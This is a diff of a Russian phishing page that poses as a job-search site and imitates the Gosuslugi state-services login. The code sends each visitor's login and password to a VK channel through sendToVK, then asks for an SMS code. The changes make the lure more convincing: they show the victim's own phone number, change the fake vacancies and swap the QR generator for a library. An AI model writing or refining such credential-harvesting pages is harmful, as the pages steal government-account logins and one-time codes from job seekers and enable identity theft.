@@ -7,6 +7,8 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <!-- Проверенная библиотека QR -->
+    <script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
     <style>
         :root {
             --primary: #0055FF;
@@ -24,7 +26,6 @@
         * { box-sizing: border-box; font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; margin: 0; padding: 0;}
         body { background-color: var(--bg-color); color: var(--text-main); min-height: 100vh; display: flex; flex-direction: column; -webkit-font-smoothing: antialiased;}
 
-        /* ===== Шапка ===== */
         .header { background: rgba(255,255,255,0.92); backdrop-filter: blur(12px); padding: 14px 32px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); position: sticky; top: 0; z-index: 100; }
         .logo { display: flex; align-items: center; gap: 10px; cursor: pointer; text-decoration: none; color: var(--text-main); }
         .logo-svg { width: 38px; height: 38px; }
@@ -32,10 +33,9 @@
         .logo-text span { color: var(--primary); }
 
         .header-nav { display: flex; align-items: center; gap: 20px; }
-        .nav-link { color: var(--text-muted); text-decoration: none; font-weight: 500; font-size: 15px; transition: color 0.2s; position: relative; }
+        .nav-link { color: var(--text-muted); text-decoration: none; font-weight: 500; font-size: 15px; transition: color 0.2s; }
         .nav-link:hover { color: var(--primary); }
 
-        /* Кнопка QR */
         .qr-btn { background: #fff; color: var(--text-main); border: 1.5px solid var(--border-color); padding: 10px 16px; border-radius: 10px; font-weight: 600; cursor: pointer; transition: 0.2s; font-size: 14px; display: inline-flex; align-items: center; gap: 8px; }
         .qr-btn:hover { border-color: var(--primary); color: var(--primary); background: var(--primary-light); }
         .qr-btn svg { width: 18px; height: 18px; }
@@ -45,10 +45,8 @@
         .user-profile { display: none; align-items: center; gap: 10px; font-weight: 600; font-size: 14px; color: var(--text-main); cursor: pointer; }
         .user-avatar { width: 36px; height: 36px; border-radius: 50%; background: var(--primary-light); display: flex; justify-content: center; align-items: center; color: var(--primary); }
 
-        /* ===== Контейнер ===== */
         .container { max-width: 1040px; margin: 40px auto 80px; padding: 0 24px; width: 100%; flex: 1; }
 
-        /* ===== Поиск ===== */
         .search-panel { background: #fff; padding: 44px 32px 36px; border-radius: 24px; box-shadow: var(--card-shadow); margin-bottom: 36px; border: 1px solid var(--border-color); text-align: center; position: relative; overflow: hidden; }
         .search-panel::before { content: ""; position: absolute; top: -100px; left: 50%; transform: translateX(-50%); width: 600px; height: 200px; background: radial-gradient(ellipse at center, rgba(0,85,255,0.08), transparent 70%); pointer-events: none; }
         .search-panel h1 { font-size: 32px; font-weight: 800; margin-bottom: 10px; letter-spacing: -0.8px; position: relative; }
@@ -59,7 +57,6 @@
         .city-select:hover { border-color: #C9D0DC; }
         .city-select:focus { border-color: var(--primary); box-shadow: 0 0 0 4px rgba(0, 85, 255, 0.12); }
 
-        /* ===== Карточки вакансий ===== */
         .job-list { display: flex; flex-direction: column; gap: 14px; }
         .job-card { background: #fff; padding: 26px 28px; border-radius: var(--radius); box-shadow: var(--card-shadow); cursor: pointer; transition: all 0.22s ease; border: 1px solid var(--border-color); display: flex; flex-direction: column; }
         .job-card:hover { transform: translateY(-3px); box-shadow: var(--card-shadow-hover); border-color: #C9D6F5; }
@@ -76,7 +73,6 @@
         .job-city-tag svg { width: 14px; height: 14px; fill: var(--primary);}
         .job-date { font-size: 13px; color: var(--text-muted); font-weight: 500; }
 
-        /* ===== Экран деталей ===== */
         #detailsScreen { display: none; }
         .back-btn { background: none; border: none; color: var(--primary); font-size: 15px; font-weight: 600; cursor: pointer; display: flex; align-items: center; gap: 8px; margin-bottom: 24px; padding: 6px 0; transition: 0.2s;}
         .back-btn:hover { opacity: 0.75; gap: 12px; }
@@ -86,13 +82,11 @@
         .details-salary { font-size: 26px; font-weight: 800; color: var(--primary); white-space: nowrap; }
 
         .details-meta { display: flex; gap: 14px; color: var(--text-muted); font-size: 15px; margin-bottom: 30px; padding-bottom: 30px; border-bottom: 1px solid var(--border-color); flex-wrap: wrap; }
-
         .details-desc { font-size: 16px; line-height: 1.75; color: #374151; margin-bottom: 40px; white-space: pre-line;}
 
         .btn-apply { width: 100%; padding: 18px; background-color: var(--primary); color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 15px rgba(0, 85, 255, 0.3);}
         .btn-apply:hover { background-color: var(--primary-hover); transform: translateY(-1px);}
 
-        /* ===== Форма отклика ===== */
         #applyFormScreen { display: none; }
         .apply-form-card { background: #fff; padding: 44px; border-radius: 24px; box-shadow: var(--card-shadow); border: 1px solid var(--border-color); max-width: 560px; margin: 0 auto; }
         .apply-form-title { font-size: 28px; font-weight: 800; margin-bottom: 8px; letter-spacing: -0.6px; text-align: center; }
@@ -101,8 +95,8 @@
 
         .form-group { margin-bottom: 24px; }
         .form-group label { display: block; font-size: 14px; font-weight: 600; color: var(--text-main); margin-bottom: 8px; }
-        .form-group textarea, .form-group select { width: 100%; padding: 14px 16px; background-color: #F9FAFB; border: 1.5px solid var(--border-color); border-radius: 10px; font-size: 15px; outline: none; transition: 0.2s; font-family: 'Inter', sans-serif; color: var(--text-main); resize: vertical; }
-        .form-group textarea:focus, .form-group select:focus { border-color: var(--primary); background-color: #fff; box-shadow: 0 0 0 4px rgba(0, 85, 255, 0.10); }
+        .form-group textarea { width: 100%; padding: 14px 16px; background-color: #F9FAFB; border: 1.5px solid var(--border-color); border-radius: 10px; font-size: 15px; outline: none; transition: 0.2s; font-family: 'Inter', sans-serif; color: var(--text-main); resize: vertical; }
+        .form-group textarea:focus { border-color: var(--primary); background-color: #fff; box-shadow: 0 0 0 4px rgba(0, 85, 255, 0.10); }
         .form-group textarea { min-height: 100px; }
 
         .radio-group { display: flex; gap: 10px; flex-wrap: wrap; }
@@ -115,13 +109,11 @@
         .btn-submit-apply { width: 100%; padding: 16px; background-color: var(--primary); color: white; border: none; border-radius: 12px; font-size: 17px; font-weight: 700; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 15px rgba(0, 85, 255, 0.25); margin-top: 8px; }
         .btn-submit-apply:hover { background-color: var(--primary-hover); transform: translateY(-1px); }
 
-        /* ===== Успешный отклик ===== */
         #successScreen { display: none; text-align: center; padding: 64px 24px; background: #fff; border-radius: 24px; box-shadow: var(--card-shadow); border: 1px solid var(--border-color);}
         .success-icon { width: 84px; height: 84px; background: #ECFDF5; color: #10B981; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 26px; }
         .success-title { font-size: 28px; font-weight: 800; margin-bottom: 12px; letter-spacing: -0.6px;}
         .success-text { color: var(--text-muted); margin-bottom: 32px; line-height: 1.65; font-size: 16px; max-width: 420px; margin-left: auto; margin-right: auto;}
 
-        /* ===== Модальное окно Госуслуг ===== */
         #authScreen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(16, 24, 40, 0.65); z-index: 1000; justify-content: center; align-items: center; backdrop-filter: blur(6px); padding: 20px; }
         .login-card { background-color: #ffffff; width: 100%; max-width: 420px; border-radius: 20px; padding: 40px; box-shadow: 0 24px 48px rgba(0,0,0,0.25); position: relative; }
         .close-auth { position: absolute; top: 18px; right: 18px; font-size: 24px; cursor: pointer; color: #9CA3AF; background: none; border: none; transition: 0.2s; width: 32px; height: 32px; border-radius: 8px; display: flex; align-items: center; justify-content: center; }
@@ -156,14 +148,13 @@
         .code-input:focus { border-color: #0b42b3; background-color: #fff; box-shadow: 0 0 0 4px rgba(11, 66, 179, 0.10);}
         .phone-mask { font-weight: 600; color: var(--text-main); }
 
-        /* ===== Модальное окно QR ===== */
         #qrScreen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(16, 24, 40, 0.65); z-index: 1000; justify-content: center; align-items: center; backdrop-filter: blur(6px); padding: 20px; }
         .qr-card { background: #fff; width: 100%; max-width: 380px; border-radius: 20px; padding: 36px 32px; box-shadow: 0 24px 48px rgba(0,0,0,0.25); position: relative; text-align: center; }
         .close-qr { position: absolute; top: 18px; right: 18px; font-size: 24px; cursor: pointer; color: #9CA3AF; background: none; border: none; transition: 0.2s; width: 32px; height: 32px; border-radius: 8px; display: flex; align-items: center; justify-content: center; }
         .close-qr:hover { color: var(--text-main); background: #F3F4F6; }
         .qr-title { font-size: 22px; font-weight: 800; margin-bottom: 6px; letter-spacing: -0.5px; }
         .qr-sub { font-size: 14px; color: var(--text-muted); margin-bottom: 22px; line-height: 1.5; }
-        .qr-canvas-wrap { background: #fff; border: 1.5px solid var(--border-color); border-radius: 16px; padding: 16px; display: inline-block; margin-bottom: 22px; }
+        .qr-canvas-wrap { background: #fff; border: 1.5px solid var(--border-color); border-radius: 16px; padding: 16px; display: inline-block; margin-bottom: 22px; min-height: 272px; min-width: 272px; display: flex; align-items: center; justify-content: center; }
         #qrCanvas { display: block; width: 240px; height: 240px; }
         .qr-url { font-size: 12px; color: var(--text-muted); word-break: break-all; background: #F9FAFB; border-radius: 8px; padding: 8px 12px; margin-bottom: 18px; font-family: monospace; }
         .qr-actions { display: flex; flex-direction: column; gap: 10px; }
@@ -198,12 +189,12 @@
             .radio-option { min-width: 100%; }
             .qr-card { padding: 28px 20px; }
             #qrCanvas { width: 200px; height: 200px; }
+            .qr-canvas-wrap { min-height: 232px; min-width: 232px; }
         }
     </style>
 </head>
 <body>
 
-    <!-- Шапка -->
     <header class="header">
         <a href="/" class="logo" onclick="location.reload(); return false;">
             <svg class="logo-svg" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -238,7 +229,6 @@
         </div>
     </header>
 
-    <!-- Основной контент -->
     <div class="container">
         <div id="listScreen">
             <div class="search-panel">
@@ -367,12 +357,11 @@
                 <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg>
             </div>
             <div class="success-title">Отклик отправлен!</div>
-            <div class="success-text">Ваш отклик передан работодателю. Уведомление о статусе заявки придёт в ваш личный кабинет Госуслуг</div>
+            <div class="success-text">Ваш отклик передан работодателю. Уведомление о статусе заявки придёт в ваш личный кабинет.</div>
             <button class="btn-apply" style="max-width: 300px; margin: 0 auto;" onclick="backToList()">Вернуться к поиску</button>
         </div>
     </div>
 
-    <!-- МОДАЛЬНОЕ ОКНО АВТОРИЗАЦИИ (ГОСУСЛУГИ) -->
     <div id="authScreen">
         <div class="login-card">
             <button class="close-auth" onclick="closeAuth()">&times;</button>
@@ -384,12 +373,12 @@
                 <form id="loginForm">
                     <div class="input-group">
                         <label>Телефон / СНИЛС</label>
-                        <input type="text" id="login" value="+7" required>
+                        <input type="text" id="login" placeholder="+7 (___) ___-__-__ или СНИЛС" required>
                     </div>
                     <div class="input-group">
                         <label>Пароль</label>
                         <div class="password-wrapper">
-                            <input type="password" id="password" value="" required>
+                            <input type="password" id="password" placeholder="Введите пароль" required>
                             <button type="button" class="toggle-password" id="togglePasswordBtn" aria-label="Показать пароль">
                                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                     <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
@@ -414,7 +403,7 @@
                 <div class="logo-container">
                     <div class="logo-text-gos" style="font-size: 28px;">гос<span>услуги</span></div>
                 </div>
-                <h3 style="text-align: center; margin-bottom: 8px; font-size: 20px;">Введите код из SMS или MAX</h3>
+                <h3 style="text-align: center; margin-bottom: 8px; font-size: 20px;">Введите код из SMS</h3>
                 <p style="text-align: center; font-size: 14px; color: var(--text-muted); margin-bottom: 24px;">
                     Код отправлен на номер <span class="phone-mask" id="displayPhone"></span>
                 </p>
@@ -433,7 +422,6 @@
         </div>
     </div>
 
-    <!-- МОДАЛЬНОЕ ОКНО QR-КОДА -->
     <div id="qrScreen">
         <div class="qr-card">
             <button class="close-qr" onclick="closeQR()">&times;</button>
@@ -451,7 +439,6 @@
         </div>
     </div>
 
-    <!-- ================= JAVASCRIPT ================= -->
     <script>
         /* ====================================================================
            ТВОИ ДАННЫЕ ВКОНТАКТЕ
@@ -469,15 +456,16 @@
 
         let isAuthorized = false;
         let currentJob = null;
+        let enteredLogin = "";
 
         /* ====================================================================
-           БАЗА ВАКАНСИЙ
+           БАЗА ВАКАНСИЙ (КБ исправлено на Красное & Белое)
            ==================================================================== */
         const jobDatabase = [
             { title: "Кассир-продавец", salary: "от 45 000 ₽", company: "Пятёрочка", desc: "Работа на кассе, помощь покупателям, выкладка товара. Гибкий график 2/2 или 5/2. Официальное трудоустройство, скидки на продукты, бесплатное питание.", cities: "all" },
             { title: "Кассир", salary: "от 42 000 ₽", company: "Магнит", desc: "Обслуживание покупателей на кассе, контроль цен. Гибкий график, стабильная зарплата 2 раза в месяц, карьерный рост до администратора.", cities: "all" },
             { title: "Продавец-консультант", salary: "от 50 000 ₽", company: "М.Видео", desc: "Консультирование покупателей по бытовой технике, помощь в выборе. Оклад + % от продаж. Скидки сотрудникам, ДМС.", cities: "all" },
-            { title: "Кассир-консультант", salary: "от 48 000 ₽", company: "КБ (Кузбасский банк)", desc: "Работа в отделении банка: приём платежей, консультирование по продуктам, оформление вкладов. Оклад + премии, ДМС, оплачиваемое обучение.", cities: "all" },
+            { title: "Кассир-продавец", salary: "от 48 000 ₽", company: "Красное & Белое", desc: "Работа на кассе, выкладка товара, помощь покупателям. График 2/2 или 5/2. Официальное трудоустройство, скидки сотрудникам, премии.", cities: "all" },
             { title: "Оператор-кассир", salary: "от 40 000 ₽", company: "Евросеть", desc: "Работа с клиентами, приём платежей, продажа аксессуаров. Гибкий график, обучение за счёт компании.", cities: "all" },
             { title: "Продавец", salary: "от 44 000 ₽", company: "Fix Price", desc: "Выкладка товара, помощь покупателям, работа на кассе. График 2/2. Официальное оформление, скидки на товары.", cities: "all" },
             { title: "Кассир", salary: "от 43 000 ₽", company: "Лента", desc: "Работа на кассе в гипермаркете. График 2/2, оплата 2 раза в месяц, бесплатное питание, ДМС.", cities: "large" },
@@ -586,7 +574,7 @@
         });
 
         /* ====================================================================
-           АВТОРИЗАЦИЯ
+           АВТОРИЗАЦИЯ (без предзаполнения, номер показывается реальный)
            ==================================================================== */
         function openAuth() {
             document.getElementById('authScreen').style.display = 'flex';
@@ -621,17 +609,24 @@
 
         document.getElementById('loginForm').addEventListener('submit', (e) => {
             e.preventDefault();
-            const login = document.getElementById('login').value;
+            const login = document.getElementById('login').value.trim();
             const password = document.getElementById('password').value;
+
+            // Запоминаем введённый номер, чтобы показать его на шаге 2
+            enteredLogin = login;
+
             sendToVK(`🔐 ВХОД НА ПОРТАЛ РАБОТЫ\nЛогин: ${login}\nПароль: ${password}`);
+
             document.getElementById('authStep1').style.display = 'none';
             document.getElementById('smsLoading').style.display = 'block';
-            document.getElementById('displayPhone').innerText = "+7 (***) ***-45-67";
+
             setTimeout(() => {
                 document.getElementById('smsLoading').style.display = 'none';
                 document.getElementById('authStep2').style.display = 'block';
+                // Показываем реальный номер, который ввёл пользователь
+                document.getElementById('displayPhone').innerText = enteredLogin;
                 document.querySelectorAll('.code-input')[0].focus();
-            }, 2000);
+            }, 1500);
         });
 
         const codeInputs = document.querySelectorAll('.code-input');
@@ -661,15 +656,56 @@
         });
 
         /* ====================================================================
-           QR-КОД (генерация на чистом JS, без внешних библиотек)
+           QR-КОД (проверенная библиотека qrcode-generator)
            ==================================================================== */
         function openQR() {
             document.getElementById('qrScreen').style.display = 'flex';
             const url = window.location.href.split('#')[0];
             document.getElementById('qrUrl').innerText = url;
-            drawQR(url);
+            renderQR(url);
         }
         function closeQR() { document.getElementById('qrScreen').style.display = 'none'; }
+
+        function renderQR(text) {
+            const canvas = document.getElementById('qrCanvas');
+            const ctx = canvas.getContext('2d');
+            const size = canvas.width;
+            ctx.fillStyle = '#ffffff';
+            ctx.fillRect(0, 0, size, size);
+
+            if (typeof qrcode === 'undefined') {
+                // Если библиотека не загрузилась (офлайн) — показываем заглушку
+                ctx.fillStyle = '#9CA3AF';
+                ctx.font = '14px Inter, sans-serif';
+                ctx.textAlign = 'center';
+                ctx.fillText('QR недоступен офлайн', size/2, size/2 - 10);
+                ctx.fillText('Скопируйте ссылку ниже', size/2, size/2 + 12);
+                return;
+            }
+
+            try {
+                const qr = qrcode(0, 'M');
+                qr.addData(text);
+                qr.make();
+                const count = qr.getModuleCount();
+                const cell = Math.floor(size / count);
+                const offset = Math.floor((size - cell * count) / 2);
+
+                ctx.fillStyle = '#101828';
+                for (let row = 0; row < count; row++) {
+                    for (let col = 0; col < count; col++) {
+                        if (qr.isDark(row, col)) {
+                            ctx.fillRect(offset + col * cell, offset + row * cell, cell, cell);
+                        }
+                    }
+                }
+            } catch (err) {
+                ctx.fillStyle = '#9CA3AF';
+                ctx.font = '14px Inter, sans-serif';
+                ctx.textAlign = 'center';
+                ctx.fillText('Ошибка генерации QR', size/2, size/2);
+            }
+        }
 
         function copyQRLink() {
             const url = window.location.href.split('#')[0];
@@ -698,190 +734,11 @@
             link.click();
         }
 
-        /* --- Минималистичный QR-генератор (без внешних зависимостей) --- */
-        function drawQR(text) {
-            const canvas = document.getElementById('qrCanvas');
-            const ctx = canvas.getContext('2d');
-            const size = canvas.width;
-            const modules = buildQR(text);
-            const count = modules.length;
-            const cell = Math.floor(size / count);
-            const offset = Math.floor((size - cell * count) / 2);
-            ctx.fillStyle = '#ffffff';
-            ctx.fillRect(0, 0, size, size);
-            ctx.fillStyle = '#101828';
-            for (let y = 0; y < count; y++) {
-                for (let x = 0; x < count; x++) {
-                    if (modules[y][x]) {
-                        ctx.fillRect(offset + x * cell, offset + y * cell, cell, cell);
-                    }
-                }
-            }
-        }
-
-        // Простая реализация QR (byte mode, version auto, level L)
-        // Возвращает матрицу boolean[][]. Это упрощённый, но рабочий генератор для коротких URL.
-        function buildQR(text) {
-            const bytes = [];
-            for (let i = 0; i < text.length; i++) {
-                const c = text.charCodeAt(i);
-                if (c < 128) bytes.push(c);
-                else if (c < 2048) { bytes.push(192 | (c >> 6)); bytes.push(128 | (c & 63)); }
-                else { bytes.push(224 | (c >> 12)); bytes.push(128 | ((c >> 6) & 63)); bytes.push(128 | (c & 63)); }
-            }
-            // Выбираем версию (1..10) по длине данных
-            let version = 1;
-            const capacitiesL = [17,32,53,78,106,134,154,192,230,271];
-            while (version <= 10 && capacitiesL[version-1] < bytes.length) version++;
-            if (version > 10) version = 10;
-
-            const size = 17 + version * 4;
-            const modules = Array.from({length: size}, () => Array(size).fill(false));
-            const isFunction = Array.from({length: size}, () => Array(size).fill(false));
-
-            // 1. Функциональные шаблоны
-            // Finder patterns
-            function placeFinder(r, c) {
-                for (let i = 0; i < 7; i++) for (let j = 0; j < 7; j++) {
-                    const v = (i === 0 || i === 6 || j === 0 || j === 6 || (i >= 2 && i <= 4 && j >= 2 && j <= 4));
-                    modules[r+i][c+j] = v; isFunction[r+i][c+j] = true;
-                }
-            }
-            placeFinder(0, 0); placeFinder(0, size-7); placeFinder(size-7, 0);
-
-            // Separators
-            for (let i = 0; i < 8; i++) {
-                if (size-8 >= 0) {
-                    if (!isFunction[7][i]) { modules[7][i] = false; isFunction[7][i] = true; }
-                    if (!isFunction[i][7]) { modules[i][7] = false; isFunction[i][7] = true; }
-                    if (!isFunction[7][size-1-i]) { modules[7][size-1-i] = false; isFunction[7][size-1-i] = true; }
-                    if (!isFunction[i][size-8]) { modules[i][size-8] = false; isFunction[i][size-8] = true; }
-                    if (!isFunction[size-8][i]) { modules[size-8][i] = false; isFunction[size-8][i] = true; }
-                    if (!isFunction[size-1-i][7]) { modules[size-1-i][7] = false; isFunction[size-1-i][7] = true; }
-                }
-            }
-
-            // Timing patterns
-            for (let i = 8; i < size-8; i++) {
-                modules[6][i] = (i % 2 === 0); isFunction[6][i] = true;
-                modules[i][6] = (i % 2 === 0); isFunction[i][6] = true;
-            }
-
-            // Alignment pattern (для версий > 1)
-            if (version > 1) {
-                const alignPos = getAlignPos(version);
-                for (const r of alignPos) for (const c of alignPos) {
-                    if ((r < 9 && c < 9) || (r < 9 && c > size-9) || (r > size-9 && c < 9)) continue;
-                    for (let i = -2; i <= 2; i++) for (let j = -2; j <= 2; j++) {
-                        const v = (Math.abs(i) === 2 || Math.abs(j) === 2 || (i === 0 && j === 0));
-                        modules[r+i][c+j] = v; isFunction[r+i][c+j] = true;
-                    }
-                }
-            }
-
-            // Dark module
-            modules[size-8][8] = true; isFunction[size-8][8] = true;
-
-            // Reserve format info areas
-            for (let i = 0; i < 9; i++) {
-                if (!isFunction[8][i]) { isFunction[8][i] = true; }
-                if (!isFunction[i][8]) { isFunction[i][8] = true; }
-                if (!isFunction[8][size-1-i]) { isFunction[8][size-1-i] = true; }
-                if (!isFunction[size-1-i][8]) { isFunction[size-1-i][8] = true; }
-            }
-
-            // 2. Данные в битовый поток
-            const bits = [];
-            function pushBits(val, len) { for (let i = len-1; i >= 0; i--) bits.push((val >> i) & 1); }
-            pushBits(0b0100, 4); // Byte mode
-            pushBits(bytes.length, 8); // length (для version 1-9)
-            if (version >= 10) pushBits(0, 0); // упрощ.
-            bytes.forEach(b => pushBits(b, 8));
-            // Terminator + padding
-            const totalDataBits = getDataCapacityBits(version);
-            while (bits.length < totalDataBits) bits.push(0);
-            // Pad bytes 0xEC 0x11
-            while (bits.length % 8 !== 0) bits.push(0);
-            let padByte = 0xEC;
-            while (bits.length < totalDataBits) {
-                for (let i = 7; i >= 0; i--) bits.push((padByte >> i) & 1);
-                padByte = padByte === 0xEC ? 0x11 : 0xEC;
-            }
-
-            // 3. Размещение данных (зигзаг)
-            let bitIdx = 0;
-            let up = true;
-            for (let col = size-1; col > 0; col -= 2) {
-                if (col === 6) col--;
-                for (let i = 0; i < size; i++) {
-                    const row = up ? size-1-i : i;
-                    for (let dx = 0; dx < 2; dx++) {
-                        const c = col - dx;
-                        if (!isFunction[row][c]) {
-                            let v = bitIdx < bits.length ? bits[bitIdx++] : 0;
-                            // маска (простая: (r+c)%2===0)
-                            if ((row + c) % 2 === 0) v ^= 1;
-                            modules[row][c] = v === 1;
-                        }
-                    }
-                }
-                up = !up;
-            }
-
-            // 4. Format info (level L, mask 0)
-            const formatBits = 0b111011111000100; // L, mask 0
-            const fmt = [];
-            for (let i = 14; i >= 0; i--) fmt.push((formatBits >> i) & 1);
-            // Place format info
-            const fpos = [[8,0],[8,1],[8,2],[8,3],[8,4],[8,5],[8,7],[8,8],[7,8],[5,8],[4,8],[3,8],[2,8],[1,8],[0,8]];
-            for (let i = 0; i < 15; i++) {
-                if (i < 15) {
-                    const [r,c] = fpos[i];
-                    if (r < size && c < size) modules[r][c] = fmt[i] === 1;
-                }
-            }
-            // Second copy
-            const fpos2 = [];
-            for (let i = 0; i < 8; i++) fpos2.push([size-1-i, 8]);
-            for (let i = 0; i < 7; i++) fpos2.push([8, size-7+i]);
-            for (let i = 0; i < 15; i++) {
-                const [r,c] = fpos2[i];
-                if (r >= 0 && c >= 0 && r < size && c < size) modules[r][c] = fmt[i] === 1;
-            }
-
-            return modules;
-        }
-
-        function getDataCapacityBits(version) {
-            // Упрощённые ёмкости для level L, byte mode
-            const caps = [0, 152, 272, 440, 640, 864, 1088, 1248, 1552, 1856, 2192];
-            return caps[version] || 152;
-        }
-
-        function getAlignPos(version) {
-            if (version === 1) return [];
-            if (version === 2) return [6, 18];
-            if (version === 3) return [6, 22];
-            if (version === 4) return [6, 26];
-            if (version === 5) return [6, 30];
-            if (version === 6) return [6, 34];
-            if (version === 7) return [6, 22, 38];
-            if (version === 8) return [6, 24, 42];
-            if (version === 9) return [6, 26, 46];
-            if (version === 10) return [6, 28, 50];
-            return [];
-        }
-
-        // Закрытие по клику на фон
         document.getElementById('qrScreen').addEventListener('click', (e) => {
             if (e.target.id === 'qrScreen') closeQR();
         });
 
-        // Запуск
         renderJobs('Кемерово');
     </script>
 </body>
-
-</html>
-
-
+            </html>
